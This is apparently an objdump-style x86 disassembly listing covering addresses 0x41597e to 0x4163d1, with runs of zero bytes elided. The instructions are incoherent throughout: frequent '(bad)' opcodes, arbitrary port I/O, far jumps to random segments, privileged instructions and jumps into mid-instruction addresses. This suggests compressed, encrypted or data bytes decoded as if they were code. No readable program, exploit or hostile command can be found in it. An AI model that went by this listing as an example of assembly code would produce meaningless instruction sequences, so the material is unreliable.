  41597e:	xor    bl,bh
  415980:	fbstp  TBYTE PTR [ebx+0x55]
  415983:	imul   ecx,DWORD PTR [eax],0x7b12e460
  415989:	js     0x4159f2
  41598b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41598c:	mov    al,ds:0x4342856d
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	push   eax
  415a01:	iret   
  415a02:	aaa    
  415a03:	repz ss in al,0x0
  415a07:	add    BYTE PTR ds:0x1b000001,al
  415a0d:	repnz (bad) ds:0xfa5d6c9c
  415a14:	dec    ebp
  415a15:	or     ch,cl
  415a17:	sbb    dh,ah
  415a19:	sti    
  415a1a:	into   
  415a1b:	xchg   ecx,eax
  415a1c:	dec    eax
  415a1d:	shl    BYTE PTR [ecx],0xd5
  415a20:	xor    al,0x60
  415a22:	syscall 
  415a24:	adc    ah,cl
  415a26:	xchg   ebx,eax
  415a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a28:	stos   BYTE PTR es:[edi],al
  415a29:	loop   0x415a17
  415a2b:	rcr    ebx,cl
  415a2d:	mov    ebx,0x15ff7ca9
  415a32:	cs jne 0x415a1c
  415a35:	adc    BYTE PTR [eax-0x47],ah
  415a38:	xor    al,0x50
  415a3a:	push   ebp
  415a3b:	lods   eax,DWORD PTR ds:[esi]
  415a3c:	ja     0x415a6e
  415a3e:	adc    DWORD PTR [edi-0x5a],ecx
  415a41:	cmc    
  415a42:	sbb    DWORD PTR [ecx],edi
  415a44:	inc    ecx
  415a45:	pop    eax
  415a46:	cld    
  415a47:	int    0x6b
  415a49:	aas    
  415a4a:	scas   al,BYTE PTR es:[edi]
  415a4b:	push   cs
  415a4c:	pusha  
  415a4d:	sahf   
  415a4e:	dec    edx
  415a4f:	aaa    
  415a50:	push   0x6
  415a52:	stc    
  415a53:	loop   0x415a0b
  415a55:	test   al,0xe3
  415a57:	es or  ah,ah
  415a5a:	out    dx,eax
  415a5b:	and    DWORD PTR [edx],0x21
  415a5e:	inc    esi
  415a5f:	cld    
  415a60:	(bad)  
  415a61:	dec    esp
  415a62:	pop    edi
  415a64:	xchg   ebp,eax
  415a65:	lods   eax,DWORD PTR ds:[esi]
  415a66:	add    eax,DWORD PTR [edi]
  415a68:	lds    edi,FWORD PTR [ebp+0x65b6d451]
  415a6e:	and    BYTE PTR ds:0x8ff872a8,bh
  415a74:	adc    DWORD PTR [edi+eax*2+0x7c],edx
  415a78:	inc    ebx
  415a79:	mov    es,WORD PTR [ecx+0x2ffe4189]
  415a7f:	inc    edx
  415a80:	push   edi
  415a81:	test   ebx,ecx
  415a83:	call   0x6ef:0xa516c29f
  415a8a:	inc    ecx
  415a8b:	inc    edi
  415a8c:	inc    esp
  415a8d:	fadd   st,st(2)
  415a8f:	(bad)  
  415a90:	sbb    eax,0xc5a4bb4e
  415a95:	fst    DWORD PTR [edx+0x33]
  415a98:	arpl   WORD PTR [edi+0x545bca7f],bx
  415a9e:	jno    0x415b13
  415aa0:	sti    
  415aa1:	enter  0x7425,0x48
  415aa5:	enter  0xd9db,0x81
  415aa9:	aaa    
  415aaa:	xchg   ebx,eax
  415aab:	ins    DWORD PTR es:[edi],dx
  415aac:	pop    ebp
  415aad:	xchg   edx,eax
  415aae:	mov    DWORD PTR [ebp-0x586f9fdf],0x8036bb4c
  415ab8:	jno    0x415b2a
  415aba:	pop    ebx
  415abb:	xor    al,0xfc
  415abd:	add    bl,ah
  415abf:	sub    dh,cl
  415ac1:	pushfw 
  415ac3:	push   ss
  415ac4:	xor    edi,DWORD PTR [esi-0x5d]
  415ac7:	push   0x65
  415ac9:	retf   
  415aca:	int3   
  415acb:	jle    0x415b0e
  415acd:	fcmovnbe st,st(3)
  415acf:	add    al,0x83
  415ad1:	cmp    ch,BYTE PTR [esi-0x42]
  415ad4:	jno    0x415aa1
  415ad6:	jmp    0x4cdf7073
  415adb:	pop    eax
  415adc:	mov    esp,0xb0794ab7
  415ae1:	mov    ebp,0x1736ad9b
  415ae6:	add    ch,al
  415ae8:	mov    edx,0x5737f343
  415aed:	lods   al,BYTE PTR ds:[esi]
  415aee:	adc    al,0x80
  415af0:	inc    edi
  415af1:	(bad)  [ebx+0x12]
  415af4:	jl     0x415a9e
  415af6:	inc    esi
  415af7:	ror    ecx,0xa1
  415afa:	xchg   edi,eax
  415afb:	or     DWORD PTR [edx-0x4ba4bc75],0x7637e2b3
  415b05:	cmc    
  415b06:	in     al,0x52
  415b08:	fidivr WORD PTR [eax]
  415b0a:	repz gs dec edx
  415b0d:	pop    esi
  415b0e:	inc    edx
  415b0f:	mov    ch,0xbb
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fcomp  QWORD PTR [ecx+eiz*1-0x5]
  415b83:	(bad)  
  415b84:	cmp    esp,ebp
  415b86:	add    BYTE PTR [eax],al
  415b88:	add    eax,0x6f000001
  415b8d:	mov    ds:0x3e6c0522,eax
  415b92:	push   ebp
  415b93:	in     al,0xd2
  415b95:	aaa    
  415b96:	adc    bl,BYTE PTR [eax]
  415b98:	cmp    BYTE PTR [edi-0x58],bh
  415b9b:	sbb    esi,ebp
  415b9d:	ins    BYTE PTR es:[edi],dx
  415b9e:	or     eax,DWORD PTR ds:0x6178f864
  415ba4:	imul   edx,DWORD PTR [ebx+0x3c],0x4e979008
  415bab:	xlat   BYTE PTR ds:[ebx]
  415bac:	rcl    al,0xa4
  415baf:	jns    0x415b6d
  415bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bb2:	das    
  415bb3:	clflush BYTE PTR [ecx+edx*8]
  415bb7:	daa    
  415bb8:	jnp    0x415b75
  415bba:	mov    al,0xd1
  415bbc:	ja     0x415b43
  415bbe:	imul   edx,eax,0x56
  415bc1:	adc    esp,DWORD PTR [eax]
  415bc3:	clc    
  415bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bc5:	jns    0x415b7d
  415bc7:	lea    edx,[eax+0x6e]
  415bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bcb:	aas    
  415bcc:	rcr    DWORD PTR es:[ebx+0x1],0x28
  415bd1:	pop    ss
  415bd2:	adc    eax,0x578e54b
  415bd7:	inc    eax
  415bd8:	and    eax,0x31e21f3c
  415bdd:	mov    ecx,0xd898bdcc
  415be2:	cmp    ecx,DWORD PTR [edx+0x40eade59]
  415be8:	out    0x18,eax
  415bea:	in     eax,0xce
  415bec:	adc    al,al
  415bee:	push   edx
  415bef:	push   ecx
  415bf0:	sub    al,dh
  415bf2:	inc    ecx
  415bf3:	(bad)  
  415bf4:	shr    BYTE PTR [edi+0x650bec36],0x94
  415bfb:	int    0xd7
  415bfd:	test   eax,0x42e1843b
  415c02:	or     DWORD PTR [eax],esp
  415c04:	loope  0x415bfb
  415c06:	jb     0x415c82
  415c08:	cmp    esp,DWORD PTR [edx+edi*2-0x753c3b18]
  415c0f:	push   eax
  415c10:	adc    ebp,edi
  415c12:	aad    0xd7
  415c14:	mov    cl,0x2a
  415c16:	adc    ch,BYTE PTR [ebx+0x58]
  415c19:	mov    esp,0x697efd09
  415c1e:	or     BYTE PTR [ebp+ecx*2+0x24bf1a4],ch
  415c25:	jmp    0x415bce
  415c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c29:	call   0xc499d4d5
  415c2e:	bound  edx,QWORD PTR [esi]
  415c30:	jmp    0x4a050f47
  415c35:	js     0x415bfa
  415c37:	pop    es
  415c38:	mov    DWORD PTR [ebp+esi*2-0x37],esp
  415c3c:	arpl   di,bx
  415c3e:	sub    esi,ebx
  415c40:	icebp  
  415c41:	jmp    0x38c5afa7
  415c46:	int3   
  415c47:	shr    BYTE PTR [eax-0x4a],0xb2
  415c4b:	dec    edx
  415c4c:	sbb    BYTE PTR [edi-0x6a],cl
  415c4f:	jmp    0x1c46:0x962a24d3
  415c56:	lahf   
  415c57:	jp     0x415cd3
  415c59:	jecxz  0x415cce
  415c5b:	fwait
  415c5c:	js     0x415cb4
  415c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c5f:	inc    ecx
  415c60:	sub    eax,0x2497f55b
  415c65:	fbstp  TBYTE PTR [edi-0x6e4b1d0f]
  415c6b:	mov    bl,0x19
  415c6d:	mov    DWORD PTR [edi+0x714b0a3f],ebp
  415c73:	sbb    DWORD PTR [edx],ecx
  415c75:	idiv   DWORD PTR [ebx+ebp*1-0x55]
  415c79:	adc    DWORD PTR [edx],ebx
  415c7b:	das    
  415c7c:	sub    al,BYTE PTR [ebx]
  415c7e:	jp     0x415ce8
  415c80:	adc    al,0x9d
  415c82:	add    BYTE PTR [edx+ebx*1],0x2d
  415c86:	and    BYTE PTR [edi+0x2d],0x6
  415c8a:	fimul  WORD PTR [esi-0x69cf52b3]
  415c90:	add    BYTE PTR [eax],0x0
	...
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xd1bb121f
  415d03:	push   eax
  415d04:	inc    eax
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR ds:0x59000001,al
  415d0d:	inc    eax
  415d0e:	inc    esi
  415d0f:	jg     0x415cfb
  415d11:	mov    gs,WORD PTR [edx+0x30bd681e]
  415d17:	xor    ch,BYTE PTR gs:[edi]
  415d1a:	pop    ecx
  415d1b:	aas    
  415d1c:	adc    bl,ch
  415d1e:	dec    ebx
  415d1f:	or     BYTE PTR [ebp+0x34],bh
  415d22:	push   edi
  415d23:	loopne 0x415d91
  415d25:	jbe    0x415d45
  415d27:	cwde   
  415d28:	inc    ecx
  415d29:	and    al,0xac
  415d2b:	pop    edx
  415d2c:	dec    ecx
  415d2d:	xlat   BYTE PTR ds:[ebx]
  415d2e:	sub    eax,0x2abd7fff
  415d33:	loopne 0x415d59
  415d35:	push   es
  415d36:	pop    es
  415d37:	or     BYTE PTR [bp+0xd],0xb9
  415d3c:	adc    al,0x7a
  415d3e:	arpl   WORD PTR [edi+0x49f44bd1],bx
  415d44:	mov    dh,0x33
  415d46:	mov    bh,0x35
  415d48:	pop    ebp
  415d49:	dec    edx
  415d4a:	fsubrp st(4),st
  415d4c:	ds (bad) 
  415d4f:	std    
  415d50:	dec    esp
  415d51:	cmp    al,0xa7
  415d53:	(bad)  
  415d55:	pop    es
  415d56:	pop    edi
  415d57:	inc    esi
  415d58:	mov    ebx,0x67b598f8
  415d5d:	aas    
  415d5e:	push   ecx
  415d5f:	jne    0x415d70
  415d61:	mov    ah,0xd0
  415d63:	inc    eax
  415d64:	and    al,0xa6
  415d66:	jmp    0xca864ae7
  415d6b:	jbe    0x415d70
  415d6d:	mov    ebp,0x5a932a39
  415d72:	jb     0x415d1c
  415d74:	out    0x79,al
  415d76:	xchg   BYTE PTR [esi],ch
  415d78:	or     dl,BYTE PTR [edx]
  415d7a:	jo     0x415d42
  415d7c:	mov    ecx,0x1ed6d566
  415d81:	and    edi,DWORD PTR [edx-0xff13a32]
  415d87:	mov    dl,0x1e
  415d89:	adc    ebx,DWORD PTR [ecx]
  415d8b:	add    BYTE PTR [eax+0x7c],dh
  415d8e:	neg    DWORD PTR [eax+0x9ed7207]
  415d94:	dec    edi
  415d95:	push   cs
  415d96:	lahf   
  415d97:	in     al,dx
  415d98:	lahf   
  415d99:	out    0x21,eax
  415d9b:	out    0x96,eax
  415d9d:	xchg   bh,ch
  415d9f:	add    al,BYTE PTR gs:[esi+0x75497bc5]
  415da6:	loope  0x415db1
  415da8:	cmc    
  415da9:	push   cs
  415daa:	jmp    0x24cf:0xe069a928
  415db1:	cmp    al,0x58
  415db3:	jecxz  0x415dba
  415db5:	in     eax,0x2c
  415db7:	inc    ebp
  415db8:	and    BYTE PTR [edi],0x21
  415dbb:	push   esi
  415dbc:	add    eax,0xce18b993
  415dc1:	and    eax,0x90578315
  415dc6:	push   ds
  415dc7:	jbe    0x415e39
  415dc9:	lds    edx,FWORD PTR [edx+0x6848314a]
  415dcf:	pop    ss
  415dd0:	hlt    
  415dd1:	stc    
  415dd2:	jno    0x415e09
  415dd4:	jo     0x415dce
  415dd6:	cld    
  415dd7:	popf   
  415dd8:	(bad)  
  415dd9:	sub    eax,0xa6446a97
  415dde:	div    DWORD PTR [esi]
  415de0:	mov    DWORD PTR [ebp-0x79018431],edi
  415de6:	pop    edx
  415de7:	cmc    
  415de8:	and    al,0xd7
  415dea:	mov    ebx,0x87d4372
  415def:	mov    al,0x37
  415df1:	rcr    DWORD PTR [ecx+0x13],1
  415df4:	jns    0x415e31
  415df6:	enter  0x75c0,0xa4
  415dfa:	jge    0x415e7a
  415dfc:	xor    bh,BYTE PTR [edi]
  415dfe:	mov    cl,0x73
  415e00:	or     BYTE PTR [ebx+0x1],dl
  415e03:	test   BYTE PTR [eax+0x1c589a4a],ah
  415e09:	ds (bad) 
  415e0b:	test   BYTE PTR [ebp+0x5324287c],0x0
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x2d]
  415e81:	and    dl,cl
  415e83:	fadd   QWORD PTR [ebp-0x19]
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    eax,0xb7000001
  415e8d:	xchg   ebp,eax
  415e8e:	je     0xdb8cba21
  415e94:	ins    DWORD PTR es:[edi],dx
  415e95:	aas    
  415e96:	clc    
  415e97:	push   ebx
  415e98:	fsub   DWORD PTR [esi-0x7167f0b1]
  415e9e:	sub    al,BYTE PTR [ebx+0x328c3771]
  415ea4:	adc    ebx,DWORD PTR [edx+0x1e5f4efb]
  415eaa:	fld    DWORD PTR [esi-0x6b]
  415ead:	retf   
  415eae:	xchg   esi,eax
  415eaf:	cmp    eax,0xe02b292a
  415eb4:	fidiv  WORD PTR [ebp-0x5f]
  415eb7:	scas   eax,DWORD PTR es:[edi]
  415eb8:	loope  0x415ec3
  415eba:	jae    0x415e5d
  415ebc:	xor    bl,ah
  415ebe:	jae    0x415f38
  415ec0:	out    0x6b,eax
  415ec2:	aaa    
  415ec3:	dec    ebp
  415ec4:	(bad)  
  415ec5:	dec    esi
  415ec6:	xchg   edi,eax
  415ec7:	xor    BYTE PTR [ebx],bh
  415ec9:	and    ebp,DWORD PTR [ebx-0x5a]
  415ecc:	popf   
  415ecd:	(bad)  
  415ece:	rcl    DWORD PTR [eax],0xb6
  415ed1:	bound  edx,QWORD PTR [esi]
  415ed3:	or     DWORD PTR [esi+ebp*2],0x61
  415ed7:	xor    al,0x6d
  415ed9:	xlat   BYTE PTR ds:[ebx]
  415eda:	xchg   DWORD PTR [ebp+0x48],esp
  415edd:	(bad)  
  415edf:	aaa    
  415ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ee1:	sbb    edi,ebp
  415ee3:	adc    BYTE PTR [edx],dh
  415ee5:	add    bl,BYTE PTR [ecx]
  415ee7:	mov    ebp,0xc92c391a
  415eec:	jb     0x415f09
  415eee:	jmp    0x415f6e
  415ef0:	jmp    0x415ed5
  415ef2:	outs   dx,DWORD PTR ds:[esi]
  415ef3:	inc    edx
  415ef4:	div    edx
  415ef6:	push   edx
  415ef7:	mov    esp,0xdba42a8b
  415efc:	repz jg 0x415f5e
  415eff:	dec    ecx
  415f00:	pop    edi
  415f01:	outs   dx,DWORD PTR ds:[esi]
  415f02:	cmp    al,0xb5
  415f04:	adc    ebp,esp
  415f06:	sub    ch,bh
  415f08:	xor    esi,ebp
  415f0a:	mov    bh,0x1f
  415f0c:	std    
  415f0d:	adc    edi,ebx
  415f0f:	rol    DWORD PTR [esi-0x33],0xd1
  415f13:	aas    
  415f14:	js     0x415f13
  415f16:	cwde   
  415f17:	pop    ebx
  415f18:	test   eax,0x2bdea47a
  415f1d:	add    eax,0xb873c39b
  415f22:	movzx  ecx,BYTE PTR [ecx]
  415f25:	jle    0x415eb3
  415f27:	xor    al,BYTE PTR [edi+0x24]
  415f2a:	xor    BYTE PTR [esi+0x48],bl
  415f2d:	test   ebx,ebp
  415f2f:	jmp    0x40f4:0xddd894d
  415f36:	jmp    0x274cff2b
  415f3b:	sub    bh,BYTE PTR [eax-0x5b]
  415f3e:	pop    ecx
  415f3f:	xchg   edi,eax
  415f40:	shl    DWORD PTR [ebx+0x40],1
  415f43:	xor    al,BYTE PTR [edi-0x571147e6]
  415f49:	jno    0x415f31
  415f4b:	jge    0x415f16
  415f4d:	test   eax,0x3a30b030
  415f52:	jmp    0x3ccd1509
  415f57:	stc    
  415f58:	enter  0x471e,0xee
  415f5c:	cmp    DWORD PTR [edx+0x12],edx
  415f5f:	or     bh,BYTE PTR [eax]
  415f61:	test   eax,0xf7005469
  415f66:	ffree  st(6)
  415f68:	dec    edx
  415f69:	jno    0x415f0e
  415f6b:	out    dx,eax
  415f6c:	cmp    eax,0x953b347d
  415f71:	test   al,0x41
  415f73:	jns    0x415f74
  415f75:	jl     0x415f2a
  415f77:	xchg   ebx,eax
  415f78:	in     al,dx
  415f79:	jbe    0x415f52
  415f7b:	adc    eax,0x4116b21
  415f80:	stc    
  415f81:	mov    edx,0xec8ef8a4
  415f86:	push   cs
  415f87:	(bad)  
  415f88:	and    eax,0x1549930a
  415f8d:	jbe    0x415f34
  415f8f:	or     edi,DWORD PTR [edx]
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	pop    ds
  416001:	and    DWORD PTR [edi+0xe84a00],0x0
  416008:	add    eax,0x6d000001
  41600d:	push   ebx
  41600e:	push   es
  41600f:	sti    
  416010:	jg     0x415fca
  416012:	rcl    BYTE PTR [ecx],1
  416014:	iret   
  416015:	sbb    DWORD PTR [ebp-0x76],edi
  416018:	lahf   
  416019:	cmp    DWORD PTR [ebp+0x75d86fee],edx
  41601f:	pandn  mm1,QWORD PTR [edx-0x2f]
  416023:	add    al,0x9c
  416025:	(bad)  
  416026:	ss mov dl,0xe5
  416029:	rol    BYTE PTR fs:[eax-0x5b750393],cl
  416030:	dec    ecx
  416031:	iret   
  416032:	jecxz  0x416051
  416034:	add    BYTE PTR [edx-0x4b],dh
  416037:	add    BYTE PTR [edx-0x2fb0a5d7],cl
  41603d:	xchg   ebx,eax
  41603e:	cmp    eax,0xd1f75942
  416043:	mov    cl,0x4c
  416045:	sbb    DWORD PTR [ebp-0x7],ebx
  416048:	push   cs
  416049:	push   cs
  41604a:	push   esi
  41604b:	push   es
  41604c:	dec    esp
  41604d:	add    al,BYTE PTR [ebx]
  41604f:	adc    edi,ebp
  416051:	out    dx,eax
  416052:	stos   DWORD PTR es:[edi],eax
  416053:	or     bl,BYTE PTR [ebp+0x7063eb08]
  416059:	mov    ah,0x23
  41605b:	and    al,0xd6
  41605d:	jp     0x415fe7
  41605f:	js     0x416046
  416061:	mov    ds:0x2d18600a,eax
  416066:	xor    DWORD PTR [edi-0x56cfa874],eax
  41606c:	and    dh,BYTE PTR [ecx]
  41606e:	hlt    
  41606f:	rcl    DWORD PTR [ebx],cl
  416071:	sub    al,0xaa
  416073:	dec    edi
  416074:	mov    esp,0x536c5ab
  416079:	pushf  
  41607a:	fwait
  41607b:	push   0x13
  41607d:	mov    ds:0x460b289c,eax
  416082:	xchg   ebp,eax
  416083:	sub    DWORD PTR [edx-0x333fda3d],ebp
  416089:	test   al,0xb3
  41608b:	mov    esp,DWORD PTR [ebx-0x53]
  41608e:	scas   eax,DWORD PTR es:[edi]
  41608f:	idiv   ecx
  416091:	rol    DWORD PTR [edi+0x325a6e82],0x1b
  416098:	cvtps2pi mm7,xmm4
  41609b:	stc    
  41609c:	jno    0x41610e
  41609e:	xor    cl,BYTE PTR [esp+esi*8-0x7b852371]
  4160a5:	and    DWORD PTR [edx+0x7a93c9d2],eax
  4160ab:	arpl   WORD PTR ds:0x2307c542,dx
  4160b1:	mov    ds:0xd20f8d8e,al
  4160b6:	mov    ds:0x2a0b616,eax
  4160bb:	mov    ebx,0x69fcdcf4
  4160c0:	aaa    
  4160c1:	clc    
  4160c2:	mov    eax,0xe2064551
  4160c7:	sbb    dl,BYTE PTR [eax-0x7d18384c]
  4160cd:	hlt    
  4160ce:	das    
  4160cf:	mov    al,ds:0x66333e93
  4160d4:	cmp    BYTE PTR [eax-0x44],cl
  4160d7:	push   esi
  4160d8:	in     al,dx
  4160d9:	enter  0xcf12,0xf2
  4160dd:	ud2    
  4160df:	dec    ebx
  4160e0:	or     al,0xd7
  4160e2:	into   
  4160e3:	push   ecx
  4160e4:	lods   al,BYTE PTR ds:[esi]
  4160e5:	push   0x77bfc1a1
  4160ea:	inc    esi
  4160eb:	cmpxchg DWORD PTR [ecx-0x553dbac8],edx
  4160f2:	mov    bh,0xb3
  4160f4:	rol    DWORD PTR [esi],0x2d
  4160f7:	adc    al,0x1b
  4160f9:	or     dh,dh
  4160fb:	push   0xd4f09646
  416100:	mov    dh,0xbd
  416102:	fbstp  TBYTE PTR [eax+0x3f]
  416105:	add    al,0xda
  416107:	ins    DWORD PTR es:[edi],dx
  416108:	xchg   edx,eax
  416109:	mov    esi,0xa43fd0ed
  41610e:	lock je 0x416162
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x3abb2af3
  416183:	popf   
  416184:	dec    edi
  416185:	jmp    0x146618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	push   eax
  41618d:	mov    dl,0x1e
  41618f:	mov    eax,0xd833c791
  416194:	and    BYTE PTR [ecx],bl
  416196:	add    al,0x39
  416198:	add    bl,ch
  41619a:	nop
  41619b:	enter  0xc807,0x8
  41619f:	jmp    0x3767cbe7
  4161a4:	jne    0x416213
  4161a6:	in     al,dx
  4161a7:	mov    ah,0xb7
  4161a9:	ins    DWORD PTR es:[edi],dx
  4161aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161ab:	mov    ecx,0x95c7b4ad
  4161b0:	loopne 0x416156
  4161b2:	mov    ebx,0xfda19e6f
  4161b7:	(bad)  
  4161b8:	data16 mov ch,0xaa
  4161bb:	mov    ss,esp
  4161bd:	test   DWORD PTR [edx+0x3055c87a],ecx
  4161c3:	nop
  4161c4:	push   0x1a0e3be8
  4161c9:	lds    edi,FWORD PTR ss:[eax+0x44300208]
  4161d0:	call   0xd20dc0c0
  4161d5:	out    0x68,eax
  4161d7:	imul   ebp,DWORD PTR [esi+esi*8-0x31],0x65655d8a
  4161df:	pop    eax
  4161e0:	and    bh,dl
  4161e2:	ins    DWORD PTR es:[edi],dx
  4161e3:	cmp    al,0xbb
  4161e5:	out    dx,eax
  4161e6:	mov    eax,ds:0x815c6b04
  4161eb:	in     al,0xeb
  4161ed:	pop    ecx
  4161ee:	cwde   
  4161ef:	in     al,dx
  4161f0:	pop    ss
  4161f1:	inc    esp
  4161f2:	pushf  
  4161f3:	repz jge 0x416260
  4161f6:	in     eax,0xb8
  4161f8:	dec    esp
  4161f9:	sub    ebx,0x47
  4161fc:	ret    0x6aa6
  4161ff:	jp     0x4161cd
  416201:	push   ss
  416202:	adc    cl,BYTE PTR [ebx+0x2c]
  416205:	xchg   DWORD PTR [ebp-0x5a],ebp
  416208:	sbb    al,0x65
  41620a:	jp     0x416252
  41620c:	sbb    DWORD PTR [ebx+edi*2-0xdc176dc],0x4e
  416214:	in     al,dx
  416215:	xchg   esp,eax
  416216:	lock imul bh
  416219:	inc    ecx
  41621a:	or     al,BYTE PTR [esi-0x46]
  41621d:	pop    ebp
  41621e:	es test eax,0xbdc84be7
  416224:	ja     0x4162a3
  416226:	fisttp WORD PTR [ebx+0x16]
  416229:	in     al,dx
  41622a:	imul   edi,DWORD PTR [esi+0xf],0x7a
  41622e:	mov    bh,0x5e
  416230:	xor    al,0xaa
  416232:	sbb    eax,0x40e64419
  416237:	cs scas eax,DWORD PTR es:[edi]
  416239:	inc    edi
  41623a:	stc    
  41623b:	div    DWORD PTR [eax+0x794300e2]
  416241:	ja     0x4162a5
  416243:	imul   BYTE PTR [eax]
  416245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416246:	lock inc ecx
  416248:	mov    DWORD PTR [ebp-0x5b],edx
  41624b:	into   
  41624c:	jmp    0x9bc0:0x2b1ba0d7
  416253:	add    dl,BYTE PTR [edi]
  416255:	lock push ebp
  416257:	xchg   esp,eax
  416258:	sub    dl,dh
  41625a:	in     eax,0x8d
  41625c:	mov    dl,0xe
  41625e:	in     eax,dx
  41625f:	mov    eax,0x8924c69a
  416264:	cmp    eax,0xe86e0a12
  416269:	int3   
  41626a:	mov    dl,0xf1
  41626c:	(bad)  
  41626d:	xchg   BYTE PTR [esi],ch
  41626f:	push   ebx
  416270:	mov    edx,eax
  416272:	pop    ebp
  416273:	dec    esp
  416274:	push   eax
  416275:	sbb    DWORD PTR [eax+0x31],eax
  416278:	inc    esi
  416279:	dec    edx
  41627a:	dec    ebx
  41627b:	fst    QWORD PTR [edx]
  41627d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41627e:	adc    DWORD PTR [esi+eiz*8+0x5d661162],esp
  416285:	mov    bl,BYTE PTR [ebp+0x73]
  416288:	inc    edx
  416289:	cmp    eax,0x7aef8262
  41628e:	in     al,0x7d
  416290:	in     eax,0x0
	...
  4162f2:	add    BYTE PTR [eax],al
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x5486:0x589b2dee
  416305:	jmp    0x0:0x1050000
  41630c:	mov    edi,0x5945dbaa
  416311:	dec    edi
  416312:	pusha  
  416313:	push   0x14
  416315:	adc    dh,dl
  416317:	pop    ebp
  416318:	adc    eax,0xb2684b8
  41631d:	inc    eax
  41631e:	fcomp  st(6)
  416320:	mov    ebp,0x5d4d6702
  416325:	sahf   
  416326:	sar    DWORD PTR [edi+0x67],0xa9
  41632a:	outs   dx,DWORD PTR ds:[esi]
  41632b:	(bad)  [edi]
  41632d:	cmp    ah,BYTE PTR [ebx]
  41632f:	pop    ss
  416330:	jae    0x4162c7
  416332:	shr    al,cl
  416334:	mov    cl,0x1f
  416336:	mov    ds:0xfb37d229,eax
  41633b:	dec    DWORD PTR [ecx]
  41633d:	add    eax,0xdd7fecab
  416342:	push   0x3
  416344:	pop    ds
  416345:	shr    edx,0xce
  416348:	std    
  416349:	scas   al,BYTE PTR es:[edi]
  41634a:	cmp    eax,0x10349913
  41634f:	or     eax,DWORD PTR [ebx-0x2d22d100]
  416355:	mov    ch,0xf3
  416357:	jb     0x4162e0
  416359:	xor    eax,0xb1ed7e2e
  41635e:	mov    cl,0x9
  416360:	add    al,0x1
  416362:	push   ss
  416363:	es mov edx,0xf30d374b
  416369:	adc    bh,BYTE PTR [ebx-0x68]
  41636c:	push   esp
  41636d:	dec    cx
  41636f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416370:	dec    esp
  416371:	(bad)  
  416372:	mov    bh,0x48
  416374:	adc    al,0xdf
  416376:	inc    ebp
  416377:	mov    ch,0xed
  416379:	push   ds
  41637a:	add    eax,0x99944c1
  41637f:	mov    al,ds:0xd5d2cd46
  416384:	jg     0x416319
  416386:	(bad)  
  416387:	imul   ebx
  416389:	and    dl,BYTE PTR [ebp-0x45]
  41638c:	pushf  
  41638d:	jp     0x416341
  41638f:	jb     0x416315
  416391:	push   es
  416392:	stos   DWORD PTR es:[edi],eax
  416393:	dec    eax
  416394:	xchg   esp,eax
  416395:	jbe    0x416367
  416397:	dec    ebp
  416398:	int3   
  416399:	in     eax,dx
  41639a:	lods   eax,DWORD PTR ds:[esi]
  41639b:	daa    
  41639c:	hlt    
  41639d:	jle    0x41639e
  41639f:	adc    al,0xc6
  4163a1:	inc    ebp
  4163a2:	pop    ebx
  4163a3:	(bad)  
  4163a4:	xor    cl,ch
  4163a6:	xlat   BYTE PTR ds:[ebx]
  4163a7:	push   ds
  4163a8:	stos   BYTE PTR es:[edi],al
  4163a9:	pop    edx
  4163aa:	xor    dl,BYTE PTR [eax-0x3570f7ce]
  4163b0:	jb     0x416395
  4163b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163b3:	icebp  
  4163b4:	adc    DWORD PTR [ebx+esi*2-0x28cd7e4c],eax
  4163bb:	add    BYTE PTR gs:[ecx+ecx*1],ah
  4163bf:	dec    ebx
  4163c0:	and    al,0xea
  4163c2:	out    dx,al
  4163c3:	retf   0x359e
  4163c6:	or     BYTE PTR [eax+0xa66f832],dh
  4163cc:	dec    eax
  4163cd:	dec    edx
  4163ce:	aas    
  4163cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d0:	stos   BYTE PTR es:[edi],al
  4163d1:	mov    ebx,0x723ef05f
